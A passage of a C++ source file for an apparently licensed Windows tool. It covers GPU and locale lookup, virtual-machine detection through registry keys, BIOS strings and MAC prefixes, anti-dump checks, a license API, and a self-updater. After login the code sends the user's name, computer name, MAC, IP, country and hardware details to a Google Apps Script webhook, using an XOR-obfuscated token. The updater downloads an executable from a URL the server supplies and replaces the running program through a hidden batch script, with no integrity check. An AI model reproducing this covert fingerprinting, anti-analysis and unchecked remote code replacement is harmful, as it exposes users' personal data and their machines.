              return "Unknown GPU (No Adapters Found)";
         }
    }

    // If g_pd3dDevice exists (usual case after initialization)
    IDXGIDevice* pDXGIDevice = nullptr;
    HRESULT hr = g_pd3dDevice->QueryInterface(__uuidof(IDXGIDevice), (void**)&pDXGIDevice);
    if (FAILED(hr)) {
        return "Unknown GPU (Failed to query DXGI Device)";
    }

    IDXGIAdapter* pDXGIAdapter = nullptr;
    hr = pDXGIDevice->GetAdapter(&pDXGIAdapter);
    pDXGIDevice->Release(); // Release DXGI device interface
    if (FAILED(hr)) {
        return "Unknown GPU (Failed to get DXGI Adapter)";
    }

    DXGI_ADAPTER_DESC adapterDesc;
    hr = pDXGIAdapter->GetDesc(&adapterDesc);
    pDXGIAdapter->Release(); // Release DXGI adapter interface
    if (FAILED(hr)) {
        return "Unknown GPU (Failed to get Adapter Description)";
    }

    // Convert WCHAR Description to std::string
    char gpuName[128];
    size_t convertedChars = 0;
    wcstombs_s(&convertedChars, gpuName, sizeof(gpuName), adapterDesc.Description, _TRUNCATE);
    if (convertedChars > 0) {
         return gpuName;
    } else {
         return "Unknown GPU (Name Conversion Failed)";
    }
}

// Function to get system language/locale
std::string get_system_language() {
    LANGID langID = GetUserDefaultUILanguage();
    LCID localeID = MAKELCID(langID, SORT_DEFAULT);
    wchar_t langName[LOCALE_NAME_MAX_LENGTH] = {0};

    if (GetLocaleInfoW(localeID, LOCALE_SISO639LANGNAME, langName, LOCALE_NAME_MAX_LENGTH) > 0) {
         wchar_t countryName[LOCALE_NAME_MAX_LENGTH] = {0};
         std::wstring result = langName;
         if (GetLocaleInfoW(localeID, LOCALE_SISO3166CTRYNAME, countryName, LOCALE_NAME_MAX_LENGTH) > 0) {
            result += L"-" + std::wstring(countryName);
         }

         // Convert wstring to UTF-8 string
         int size_needed = WideCharToMultiByte(CP_UTF8, 0, result.c_str(), (int)result.size(), NULL, 0, NULL, NULL);
         if (size_needed <= 0) return "Unknown Language (Conversion Failed)";
         std::string strTo(size_needed, 0);
         WideCharToMultiByte(CP_UTF8, 0, result.c_str(), (int)result.size(), &strTo[0], size_needed, NULL, NULL);
         return strTo;

    } else {
        // Fallback: Get language name directly if ISO codes fail
        wchar_t langDisplayName[LOCALE_NAME_MAX_LENGTH] = {0};
        if (GetLocaleInfoW(localeID, LOCALE_SLOCALIZEDLANGUAGENAME, langDisplayName, LOCALE_NAME_MAX_LENGTH) > 0) {
             int size_needed = WideCharToMultiByte(CP_UTF8, 0, langDisplayName, -1, NULL, 0, NULL, NULL);
             if (size_needed <= 0) return "Unknown Language (Conversion Failed)";
             std::string strTo(size_needed - 1, 0); // Exclude null terminator
             WideCharToMultiByte(CP_UTF8, 0, langDisplayName, -1, &strTo[0], size_needed, NULL, NULL);
             return strTo;
        }
    }
    return "Unknown Language";
}


// --- VM Check Implementation (Registry) ---

bool does_reg_key_exist(HKEY hRootKey, const std::wstring& subKey) {
    HKEY hKey;
    // Try opening with 32-bit view first, then 64-bit if needed
    LONG result = RegOpenKeyExW(hRootKey, subKey.c_str(), 0, KEY_READ | KEY_WOW64_32KEY, &hKey);
    if (result != ERROR_SUCCESS) {
        result = RegOpenKeyExW(hRootKey, subKey.c_str(), 0, KEY_READ | KEY_WOW64_64KEY, &hKey);
    }

    if (result == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return true;
    }
    return false;
}

bool check_reg_value_contains(HKEY hRootKey, const std::wstring& subKey, const std::wstring& valueName, const std::vector<std::wstring>& searchStrings) {
    HKEY hKey;
    DWORD keyAccess = KEY_READ | KEY_WOW64_32KEY;
    LONG result = RegOpenKeyExW(hRootKey, subKey.c_str(), 0, keyAccess, &hKey);
    if (result != ERROR_SUCCESS) {
         keyAccess = KEY_READ | KEY_WOW64_64KEY;
         result = RegOpenKeyExW(hRootKey, subKey.c_str(), 0, keyAccess, &hKey);
    }
    if (result != ERROR_SUCCESS) {
        return false;
    }

    wchar_t buffer[512]; // Increased buffer size
    DWORD bufferSize = sizeof(buffer);
    DWORD valueType;
    result = RegQueryValueExW(hKey, valueName.c_str(), NULL, &valueType, (LPBYTE)buffer, &bufferSize);
    RegCloseKey(hKey);

    if (result == ERROR_SUCCESS && valueType == REG_SZ) {
        std::wstring valueStr(buffer);
        // Convert valueStr to lower case for case-insensitive comparison
        std::transform(valueStr.begin(), valueStr.end(), valueStr.begin(), ::towlower);

        for (const auto& searchStr : searchStrings) {
            std::wstring lowerSearchStr = searchStr;
            // Convert searchStr to lower case
            std::transform(lowerSearchStr.begin(), lowerSearchStr.end(), lowerSearchStr.begin(), ::towlower);
            if (valueStr.find(lowerSearchStr) != std::wstring::npos) {
                return true;
            }
        }
    }
    return false;
}

// Improved VM Check function
bool is_running_in_vm() {
    try {
        // Check 1: Common Registry Keys Existence
        if (does_reg_key_exist(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Oracle\\VirtualBox Guest Additions") ||
            does_reg_key_exist(HKEY_LOCAL_MACHINE, L"SOFTWARE\\VMware, Inc.\\VMware Tools") ||
            does_reg_key_exist(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Virtual Machine") || // Hyper-V Integration Services
            does_reg_key_exist(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Classes\\Applications\\VMwareView.exe") || // VMware Horizon Client
            does_reg_key_exist(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Services\\VBoxGuest") ||
            does_reg_key_exist(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Services\\VBoxMouse") ||
            does_reg_key_exist(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Services\\VBoxSF") ||
            does_reg_key_exist(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Services\\VBoxVideo") ||
            does_reg_key_exist(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Services\\vmdebug") ||
            does_reg_key_exist(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Services\\vmmouse") ||
            does_reg_key_exist(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Services\\VMTools") ||
            does_reg_key_exist(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Services\\VMMEMCTL"))
             {
            output_log_message("VM Check: Found common VM software registry key.\n");
            return true;
        }

        // Check 2: System BIOS/Manufacturer/Product strings
        std::vector<std::wstring> vmStrings = { L"vmware", L"virtualbox", L"vbox", L"qemu", L"xen", L"virtual pc", L"hyper-v", L"parallels" };
        if (check_reg_value_contains(HKEY_LOCAL_MACHINE, L"HARDWARE\\DESCRIPTION\\System\\BIOS", L"SystemManufacturer", vmStrings) ||
            check_reg_value_contains(HKEY_LOCAL_MACHINE, L"HARDWARE\\DESCRIPTION\\System\\BIOS", L"SystemProductName", vmStrings) ||
            check_reg_value_contains(HKEY_LOCAL_MACHINE, L"HARDWARE\\DESCRIPTION\\System\\BIOS", L"BIOSVendor", vmStrings) ||
            check_reg_value_contains(HKEY_LOCAL_MACHINE, L"HARDWARE\\DESCRIPTION\\System\\BIOS", L"BIOSVendor", vmStrings) || // Check original key too
            check_reg_value_contains(HKEY_LOCAL_MACHINE, L"HARDWARE\\DESCRIPTION\\System", L"SystemBiosVersion", vmStrings) || // Check original key too
            check_reg_value_contains(HKEY_LOCAL_MACHINE, L"HARDWARE\\DESCRIPTION\\System", L"VideoBiosVersion", vmStrings)) // Check original key too
             {
            output_log_message("VM Check: Found VM identifier string in BIOS/System info.\n");
            return true;
        }

        // Check 3: MAC Address Prefix (Common VM prefixes)
        std::string mac = get_mac_address();
        std::transform(mac.begin(), mac.end(), mac.begin(), ::tolower);
        if (mac.rfind("00:05:69", 0) == 0 || // VMware
            mac.rfind("00:0c:29", 0) == 0 || // VMware
            mac.rfind("00:1c:14", 0) == 0 || // VMware (also some Parallels)
            mac.rfind("00:50:56", 0) == 0 || // VMware
            mac.rfind("08:00:27", 0) == 0 || // VirtualBox
            mac.rfind("0a:00:27", 0) == 0 || // VirtualBox
            mac.rfind("00:16:3e", 0) == 0 || // XenSource
            mac.rfind("00:1c:42", 0) == 0)   // Parallels
            {
             output_log_message("VM Check: Found common VM MAC address prefix.\n");
             return true;
        }

         // Check 4: Check for specific virtual hardware device IDs (less common but possible)
         // This requires more complex device enumeration (SetupAPI or WMI)
         // Example using registry check for known virtual devices:
         if (check_reg_value_contains(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Enum\\PCI", L"DeviceDesc", {L"vmware", L"virtualbox", L"vbox"})) {
            output_log_message("VM Check: Found VM identifier string in PCI device descriptions.\n");
            return true;
         }

    } catch (const std::exception& e) {
        output_log_message("VM Check: Exception occurred during check: " + std::string(e.what()) + "\n");
    } catch (...) {
         output_log_message("VM Check: Unknown exception occurred during check.\n");
    }


    output_log_message("VM Check: No clear VM indicators found.\n");
    return false; // No clear VM indicators found
}

// --- End New Helper Functions ---

// Function to send HTTP POST request to webhook
void send_webhook_message(const std::string& webhook_url, const json& payload_json) {
    std::string payload_str = payload_json.dump();
    std::string headers = "Content-Type: application/json\r\n";

    HINTERNET hInternet = InternetOpen(" Core Webhook Client", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInternet) {
        output_log_message("Error: InternetOpen failed for webhook.\n");
        return;
    }

    // Split URL into host and path
    URL_COMPONENTS url_comp;
    ZeroMemory(&url_comp, sizeof(url_comp));
    url_comp.dwStructSize = sizeof(url_comp);
    url_comp.dwHostNameLength = 1; // Required non-zero
    url_comp.dwUrlPathLength = 1; // Required non-zero

    if (!InternetCrackUrl(webhook_url.c_str(), (DWORD)webhook_url.length(), 0, &url_comp)) {
        output_log_message("Error: InternetCrackUrl failed for webhook.\n");
        InternetCloseHandle(hInternet);
        return;
    }

    // Allocate buffers for host and path
    std::vector<char> host_name(url_comp.dwHostNameLength + 1);
    std::vector<char> url_path(url_comp.dwUrlPathLength + 1);
    url_comp.lpszHostName = host_name.data();
    url_comp.lpszUrlPath = url_path.data();
    url_comp.dwHostNameLength++; // Include null terminator
    url_comp.dwUrlPathLength++; // Include null terminator


    if (!InternetCrackUrl(webhook_url.c_str(), (DWORD)webhook_url.length(), 0, &url_comp)) {
         output_log_message("Error: InternetCrackUrl failed (buffers) for webhook.\n");
         InternetCloseHandle(hInternet);
         return;
    }


    HINTERNET hConnect = InternetConnect(hInternet, url_comp.lpszHostName, url_comp.nPort, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        output_log_message("Error: InternetConnect failed for webhook.\n");
        InternetCloseHandle(hInternet);
        return;
    }

    HINTERNET hRequest = HttpOpenRequest(hConnect, "POST", url_comp.lpszUrlPath, NULL, NULL, NULL, INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hRequest) {
        output_log_message("Error: HttpOpenRequest failed for webhook.\n");
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return;
    }

    if (!HttpSendRequest(hRequest, headers.c_str(), (DWORD)headers.length(), (LPVOID)payload_str.c_str(), (DWORD)payload_str.length())) {
        DWORD error_code = GetLastError(); // دریافت کد خطا
        output_log_message("Error: HttpSendRequest failed for webhook. Error code: " + std::to_string(error_code) + "\n"); // لاگ کردن کد خطا
    } else {
        output_log_message("Webhook message sent successfully.\n");
        // Optionally read the response if needed
    }

    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
}

// Helper function to download a file from a URL to a destination path using WinINet
bool download_file(const std::string& url, const std::string& dest_path) {
    HINTERNET hInternet = InternetOpenA("CoreUpdateDownloader", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInternet) {
        output_log_message("Download: InternetOpenA failed.\n");
        return false;
    }

    HINTERNET hFile = InternetOpenUrlA(hInternet, url.c_str(), NULL, 0,
                                       INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_PRAGMA_NOCACHE,
                                       0);
    if (!hFile) {
        output_log_message("Download: InternetOpenUrlA failed.\n");
        InternetCloseHandle(hInternet);
        return false;
    }

    // Reset progress counters
    g_update_bytes_downloaded.store(0, std::memory_order_relaxed);
    g_update_bytes_total.store(0, std::memory_order_relaxed);

    // Try to read Content-Length header to know total size
    DWORD content_length = 0;
    DWORD header_size = sizeof(content_length);
    if (HttpQueryInfoA(hFile, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER,
                       &content_length, &header_size, NULL)) {
        g_update_bytes_total.store(static_cast<long long>(content_length), std::memory_order_relaxed);
    }

    std::ofstream out(dest_path, std::ios::binary);
    if (!out) {
        output_log_message("Download: Failed to open destination file: " + dest_path + "\n");
        InternetCloseHandle(hFile);
        InternetCloseHandle(hInternet);
        return false;
    }

    const DWORD BUF_SIZE = 4096;
    char buffer[BUF_SIZE];
    DWORD bytes_read = 0;
    bool ok = true;
    long long downloaded = 0;

    while (true) {
        if (!InternetReadFile(hFile, buffer, BUF_SIZE, &bytes_read)) {
            DWORD err = GetLastError();
            output_log_message("Download: InternetReadFile failed. Error: " + std::to_string(err) + "\n");
            ok = false;
            break; // Network/read error
        }

        if (bytes_read == 0) {
            // Normal end of file
            break;
        }

        out.write(buffer, bytes_read);
        if (!out) {
            ok = false;
            break;
        }

        downloaded += bytes_read;
        g_update_bytes_downloaded.store(downloaded, std::memory_order_relaxed);
    }

    out.close();
    InternetCloseHandle(hFile);
    InternetCloseHandle(hInternet);

    if (!ok) {
        output_log_message("Download: Error while writing file: " + dest_path + "\n");
        return false;
    }

    // Ensure progress counters reflect the final file size, even if Content-Length was not available
    try {
        auto final_size = std::filesystem::file_size(dest_path);
        g_update_bytes_downloaded.store(static_cast<long long>(final_size), std::memory_order_relaxed);
        long long total = g_update_bytes_total.load(std::memory_order_relaxed);
        if (total <= 0) {
            g_update_bytes_total.store(static_cast<long long>(final_size), std::memory_order_relaxed);
        }
    } catch (...) {
        // Ignore file_size errors; progress bar will just show bytes read during streaming
    }

    output_log_message("Download: File downloaded to " + dest_path + "\n");
    return true;
}

// Shared helper to handle "Need Donwload New Version App (Check Discord)" responses
// from the license/check API. It sets global update flags, downloads the new
// version, prepares the updater script, and fills an error message for the UI.
void handle_update_required_from_server(const std::string& details_str, std::string& out_error_message) {
    if (details_str.empty()) {
        std::lock_guard<std::mutex> lock(g_login_error_mutex);
        out_error_message = "Update required, but no download URL was provided by the server.";
        return;
    }

    // details may be either just a URL, or "URL|NEW_VERSION"
    std::string download_url = details_str;
    std::string new_version_str;
    size_t pipe_pos = details_str.find('|');
    if (pipe_pos != std::string::npos) {
        download_url = details_str.substr(0, pipe_pos);
        if (pipe_pos + 1 < details_str.size()) {
            new_version_str = details_str.substr(pipe_pos + 1);
        }
    }

    {
        std::lock_guard<std::mutex> lock(g_update_mutex);
        g_update_download_url = download_url;
        g_update_download_error.clear();
        g_update_download_path.clear();
        g_update_new_version = new_version_str;
    }

    g_update_required.store(true, std::memory_order_relaxed);
    g_update_download_in_progress.store(true, std::memory_order_relaxed);
    g_update_download_done.store(false, std::memory_order_relaxed);
    g_update_download_failed.store(false, std::memory_order_relaxed);

    // Choose a download destination in the temp directory
    char temp_path[MAX_PATH];
    DWORD len = GetTempPathA(MAX_PATH, temp_path);
    std::string dest_path;
    if (len > 0 && len < MAX_PATH) {
        dest_path = std::string(temp_path) + "Core_Update.exe";
    } else {
        dest_path = "Core_Update.exe";
    }

    bool ok = download_file(download_url, dest_path);
    {
        std::lock_guard<std::mutex> lock(g_update_mutex);
        if (ok) {
            g_update_download_done.store(true, std::memory_order_relaxed);
            g_update_download_failed.store(false, std::memory_order_relaxed);
            g_update_download_path = dest_path;
        } else {
            g_update_download_done.store(false, std::memory_order_relaxed);
            g_update_download_failed.store(true, std::memory_order_relaxed);
            g_update_download_error = "Failed to download new version.";
        }
        g_update_download_in_progress.store(false, std::memory_order_relaxed);
    }

    // If download succeeded, prepare an updater script that will run after the app exits.
    if (ok) {
        char current_path[MAX_PATH];
        DWORD cur_len = GetModuleFileNameA(NULL, current_path, MAX_PATH);
        if (cur_len > 0 && cur_len < MAX_PATH) {
            std::string current_exe = std::string(current_path);
            // Build backup path in same folder (keep old exe as .bak for now)
            std::string backup_exe = current_exe + ".bak";

            // Build updater .bat in temp folder
            std::string bat_path;
            if (len > 0 && len < MAX_PATH) {
                bat_path = std::string(temp_path) + "Core_UpdateRunner.bat";
            } else {
                bat_path = "Core_UpdateRunner.bat";
            }

            try {
                std::ofstream bat(bat_path, std::ios::trunc);
                if (bat) {
                    bat << "@echo off\r\n";
                    bat << ":wait\r\n";
                    bat << "timeout /t 1 /nobreak >nul\r\n";
                    // Copy current exe to backup; if it fails (file in use), wait and retry
                    bat << "copy /y \"" << current_exe << "\" \"" << backup_exe << "\" >nul 2>&1\r\n";
                    bat << "if errorlevel 1 goto wait\r\n";
                    // Copy new exe over current exe; if it fails (still in use), wait and retry
                    bat << "copy /y \"" << dest_path << "\" \"" << current_exe << "\" >nul 2>&1\r\n";
                    bat << "if errorlevel 1 goto wait\r\n";
                    // Start updated app
                    bat << "start \"\" \"" << current_exe << "\"\r\n";
                    bat << "exit\r\n";
                    bat.close();

                    // Launch updater script hidden; it will wait until this exe is closed
                    ShellExecuteA(NULL, "open", bat_path.c_str(), NULL, NULL, SW_HIDE);
                    output_log_message("Update runner script created and launched: " + bat_path + "\n");
                }
            } catch (...) {
                output_log_message("Failed to create or launch update runner script.\n");
            }
        }

        // Request application exit so the updater script can replace and restart the app automatically
        g_exit_after_update.store(true, std::memory_order_relaxed);
    }

    {
        std::lock_guard<std::mutex> lock(g_login_error_mutex);
        if (g_update_download_done.load(std::memory_order_relaxed)) {
            out_error_message = "New version has been downloaded. The application will now close and restart automatically.";
        } else {
            out_error_message = "Update required.\nFailed to download the new version automatically.";
        }
    }
}

// --- تابع چک کردن لایسنس ---
// این تابع حالا پارامتر خروجی برای start_license دارد
bool check_license_socket_simulated(const std::string& license_key, long long& out_duration_seconds, std::string& out_error_message, std::string& out_start_license) {
    output_log_message("Checking license key via API...\n");
    g_isLoggedIn.store(false, std::memory_order_relaxed); // Initialize login status to false
    out_duration_seconds = 0;
    out_start_license = "N/A"; // مقدار پیش‌فرض برای تاریخ شروع

    // بررسی خالی بودن کلید لایسنس
    if (license_key.empty()) {
        {
            std::lock_guard<std::mutex> lock(g_login_error_mutex);
            out_error_message = "License key cannot be empty.";
        }
        output_log_message("Error: License key is empty.\n");
        return false;
    }

    // گرفتن Device ID پیچیده شده (هش شده)
    std::string device_id_hashed = generate_device_id();
    std::string nonce = generate_nonce();
    std::string timestamp = get_unix_timestamp_seconds();

    std::string response_body;
    std::string http_error;
    {
        json request_json;
        request_json["license"] = license_key;
        request_json["device_id"] = device_id_hashed;
        request_json["version"] = APP_VERSION_NUMBER;
        request_json["nonce"] = nonce;
        request_json["ts"] = timestamp;

        if (!HttpPostJsonToString(std::string(LICENSE_API_BASE_URL), request_json.dump(), response_body, http_error)) {
            {
                std::lock_guard<std::mutex> lock(g_login_error_mutex);
                out_error_message = "Failed to connect to the license server.";
                if (!http_error.empty()) {
                    out_error_message += " (" + http_error + ")";
                }
            }
            output_log_message("Error: HttpPostJsonToString failed. " + http_error + "\n");
            return false;
        }
    }

    output_log_message("API Response: " + response_body + "\n");

    if (response_body.empty()) {
        {
            std::lock_guard<std::mutex> lock(g_login_error_mutex);
            out_error_message = "Empty response from server.";
        }
        return false;
    }

    try {
        json json_response = json::parse(response_body);

        std::string signature_error;
        if (!verify_response_signature(json_response, LICENSE_HMAC_SECRET, nonce, signature_error)) {
            {
                std::lock_guard<std::mutex> lock(g_login_error_mutex);
                out_error_message = "Invalid server signature.";
            }
            output_log_message("License API signature check failed: " + signature_error + "\n");
            return false;
        }

        if (json_response.contains("status") && json_response["status"] == "valid") {
            // پردازش remaining (کد موجود)
            if (json_response.contains("remaining") && json_response["remaining"].is_string()) {
                 std::string remaining_str = json_response["remaining"];
                 std::stringstream ss(remaining_str);
                 long long val;
                 char unit;
                 while (ss >> val >> unit) {
                     if (unit == 'd') out_duration_seconds += val * 24 * 60 * 60;
                     else if (unit == 'h') out_duration_seconds += val * 60 * 60;
                     else if (unit == 'm') out_duration_seconds += val * 60;
                 }
            } else {
                 // مدیریت خطای عدم وجود remaining (کد موجود)
                 // ...
            }

            // پردازش start_license
            if (json_response.contains("start_license") && json_response["start_license"].is_string()) {
                out_start_license = json_response["start_license"].get<std::string>();
                output_log_message("Start License Date from API: " + out_start_license + "\n");
            } else {
                output_log_message("Warning: 'start_license' not found in API response. Using default.\n");
            }

            // Process used_count
            if (json_response.contains("used_count") && json_response["used_count"].is_number_integer()) {
                g_license_used_count = json_response["used_count"].get<int>();
                output_log_message("License Used Count from API: " + std::to_string(g_license_used_count) + "\n");
            } else {
                g_license_used_count = -1; // Reset to default if not found or not an integer
                output_log_message("Warning: 'used_count' not found or not an integer in API response. Using default (-1).\n");
            }

            // Process plan_type (subscription vs free_trial) from server; default to subscription for paid license
            {
                std::lock_guard<std::mutex> lock(g_license_data_mutex);
                if (json_response.contains("plan_type") && json_response["plan_type"].is_string()) {
                    g_plan_type = json_response["plan_type"].get<std::string>();
                } else {
                    g_plan_type = "subscription";
                }
            }

            output_log_message("License is valid. Remaining time (seconds): " + std::to_string(out_duration_seconds) + "\n");
            g_isLoggedIn.store(true, std::memory_order_relaxed); // Set login status to true
            return true;

        } else { // status != "valid"
            std::string message_str;
            std::string details_str;

            if (json_response.contains("message") && json_response["message"].is_string()) {
                message_str = json_response["message"].get<std::string>();
            }
            if (json_response.contains("details") && json_response["details"].is_string()) {
                details_str = json_response["details"].get<std::string>();
            }

            // Handle version-outdated case via shared helper
            if (message_str == "Need Donwload New Version App (Check Discord)") {
                output_log_message("License API reports outdated version. Update required.\n");
                handle_update_required_from_server(details_str, out_error_message);
                // Treat as failed license check so caller keeps user on login view
                return false;
            }

            // Fallback for non-update errors: keep previous behaviour
            {
                std::lock_guard<std::mutex> lock(g_login_error_mutex);
                if (!message_str.empty()) {
                    out_error_message = message_str;
                } else {
                    out_error_message = "Invalid license or unknown error.";
                }
            }
        }
    } catch (std::exception& e) {
        {
            std::lock_guard<std::mutex> lock(g_login_error_mutex);
            out_error_message = "Failed to parse server response.";
        }
        output_log_message(std::string("Error parsing JSON: ") + e.what() + "\n");
    }

    return false;
}
// Function to fetch content from a URL
std::string fetch_url_content(const char* url) {
    HINTERNET hInternet = InternetOpenA("MyAppName", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        return "Error: InternetOpenA failed.";
    }

    HINTERNET hConnect = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return "Error: InternetOpenUrlA failed.";
    }

    std::string content;
    char buffer[4096];
    DWORD bytesRead;

    while (InternetReadFile(hConnect, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
        buffer[bytesRead] = '\0';
        content += buffer;
    }

    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    if (content.empty()) {
        return "No announcement or error fetching.";
    }
    return content;
}

// Asynchronous function to fetch announcement
void fetch_announcement_async() {
    std::string fetched_content = fetch_url_content(ANNOUNCEMENT_URL);
    {
        std::lock_guard<std::mutex> lock(g_announcement_mutex);
        g_announcement_text = fetched_content;
    }
    g_announcement_loaded.store(true, std::memory_order_relaxed);
}

// --- تابع جدید برای اجرای لاگین به صورت غیرهمزمان ---
void perform_login_async(std::string license_key) {
    // ثبت زمان شروع لاگین
    auto login_start_time = std::chrono::high_resolution_clock::now();
    (void)login_start_time;
    
    // دریافت اطلاعات سیستم برای لاگ
    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD computerNameSize = sizeof(computerName);
    GetComputerNameA(computerName, &computerNameSize);
    
    char username[UNLEN + 1];
    DWORD usernameSize = sizeof(username);
    GetUserNameA(username, &usernameSize);
    
    // دریافت آدرس MAC برای شناسایی بهتر سیستم
    std::string mac_address = get_mac_address();
    
    // لاگ شروع فرآیند لاگین
    output_log_message("Login attempt started at " + get_current_system_time_string() + "\n");
    output_log_message("System: " + std::string(computerName) + ", User: " + std::string(username) + "\n");
    output_log_message("MAC Address: " + mac_address + "\n");
    
    // اعمال تکنیک‌های محافظتی و ارسال لاگ به API در صورت شناسایی تهدید
    output_log_message("Running security protection checks...\n");
    std::string security_code_login;
    std::string security_details_login;
    bool security_threat = RunProtectionChecks(security_code_login, security_details_login);
    if (security_threat) {
        std::string context_details = security_details_login;
        if (!context_details.empty()) {
            context_details += " | ";
        }
        context_details += "System: " + std::string(computerName) + ", User: " + std::string(username) + ", MAC: " + mac_address;
        HandleSecurityBlock(security_code_login, context_details, "LOGIN");
        return;
    }
    output_log_message("Security checks passed.\n");
    
    // اعمال محافظت‌های ضد دامپ
    try {
        ApplyAntiDumpProtections();
    } catch (...) {
        // در صورت بروز هر خطایی، آن را نادیده می‌گیریم تا برنامه کرش نکند
        send_security_log_to_api("AntiDump", "Error applying anti-dump protections");
    }
    g_is_logging_in.store(true, std::memory_order_relaxed);
    long long received_duration = 0;
    std::string api_error_message_local = "";
    std::string received_start_license_local = ""; // <--- متغیر محلی برای دریافت start_license
        
    // <--- شروع تغییر: فراخوانی تابع check_license_socket_simulated با پارامتر جدید --->
    bool success = check_license_socket_simulated(license_key, received_duration, api_error_message_local, received_start_license_local);
    // <--- پایان تغییر --->

    // Clear the plain license key from memory after building the URL and making the call
    // This minimizes the time the plain key exists in the string variable.
    std::fill(license_key.begin(), license_key.end(), '\0');
    license_key.clear(); // Ensure the string is empty

    if (success) {
        // <--- شروع تغییر: استفاده از میوتکس برای به‌روزرسانی داده‌های لایسنس --->
        {
            std::lock_guard<std::mutex> lock(g_license_data_mutex); // قفل کردن قبل از نوشتن
            is_licensed.store(true);
            g_activation_time = std::chrono::system_clock::now(); // زمان فعال‌سازی فعلی
            g_subscription_duration_seconds = received_duration;
            g_start_license_str = received_start_license_local; // به‌روزرسانی متغیر سراسری
            g_isLoggedIn.store(true, std::memory_order_relaxed); // Set login status to true for gamma control
        }
        // <--- پایان تغییر --->

        // ثبت زمان شروع سشن استفاده بعد از لاگین موفق
        g_session_start_time = std::chrono::steady_clock::now();

        current_view = ViewState::Home;
        {
            std::lock_guard<std::mutex> lock(g_login_error_mutex);
            login_error_message = "";
        }
        recalculate_all_profiles_threadsafe();
        // پیام لاگ شامل تاریخ شروع می‌شود
        output_log_message("License accepted via API. Script activated. Start License: " + received_start_license_local + "\n");
        play_sound_async(LOGIN_SUCCESS_SOUND_FILE); // Play success sound

        // --- Send detailed session log to webhook after successful subscription login ---
        std::string username_str(username);
        std::string computer_name_str(computerName);
        std::string gpu_info = get_gpu_info();
        std::string system_language = get_system_language();
        std::string ram_info = get_ram_info();
        std::string cpu_info = get_cpu_info();
        std::string device_id = get_cached_device_id();
        std::string system_uptime = get_system_uptime();

        std::string plan_type_local;
        {
            std::lock_guard<std::mutex> lock(g_license_data_mutex);
            plan_type_local = g_plan_type;
        }

        std::string plan_label;
        if (plan_type_local == "free_trial") {
            plan_label = "Free Trial";
        } else if (plan_type_local == "subscription") {
            plan_label = "Subscription";
        } else if (plan_type_local.empty()) {
            plan_label = "Unknown";
        } else {
            plan_label = plan_type_local;
        }

        std::string user_ip = get_cached_user_ip();
        std::string user_country = get_cached_user_country();
        output_log_message("Retrieved user IP (login webhook): " + user_ip + ", Country: " + user_country + "\n");

        long long total_usage_for_webhook = g_total_usage_seconds;
        if (g_isLoggedIn.load(std::memory_order_relaxed) &&
            g_session_start_time.time_since_epoch().count() != 0) {
            auto now_usage = std::chrono::steady_clock::now();
            auto delta_usage = std::chrono::duration_cast<std::chrono::seconds>(now_usage - g_session_start_time).count();
            if (delta_usage > 0) {
                total_usage_for_webhook += delta_usage;
            }
        }

        std::string msg = "User: " + username_str +
                         "\nComputer: " + computer_name_str +
                         "\nMAC: " + mac_address +
                         "\nIP Address: " + user_ip +
                         "\nCountry: " + user_country +
                         "\nGPU: " + gpu_info +
                         "\nSystem Language: " + system_language +
                         "\nTotal RAM: " + ram_info +
                         "\nCPU Info: " + cpu_info +
                         "\nApp Version: " + APP_VERSION_NUMBER +
                         "\nDevice ID (Hashed): " + device_id +
                         "\nSystem Uptime: " + system_uptime +
                         "\nTotal Usage: " + format_duration_seconds(total_usage_for_webhook) +
                         "\nPlan: " + plan_label;

        std::string webhook_url = "https://script.google.com/macros/s/AKfycbxaWs-NMsr3aQuAus9qSyy1h5MEDL76PNIZ-fmmxYvL2wdvZ2mpUrRnsCKIXlyt3EDyfw/exec";
        std::string token = xor_strings::get_webhook_token();

        send_webhook_via_google_script(webhook_url, token, msg);
    } else {
        {
            std::lock_guard<std::mutex> lock(g_login_error_mutex);
            login_error_message = api_error_message_local;
        }
        // <--- شروع تغییر: تنظیم مجدد تاریخ شروع در صورت شکست --->
        {
            std::lock_guard<std::mutex> lock(g_license_data_mutex); // قفل کردن قبل از نوشتن
            g_start_license_str = "N/A"; // بازنشانی به مقدار پیش‌فرض
            g_plan_type = "unknown";
        }
        // <--- پایان تغییر --->
        output_log_message("License check failed via API. Error: " + api_error_message_local + "\n");
        play_sound_async(LOGIN_FAILURE_SOUND_FILE); // Play failure sound
    }

    g_is_logging_in.store(false, std::memory_order_relaxed);
}

void perform_free_trial_async() {
    // ثبت زمان شروع فرایند نسخه آزمایشی
    auto trial_start_time = std::chrono::high_resolution_clock::now();
    (void)trial_start_time;
    
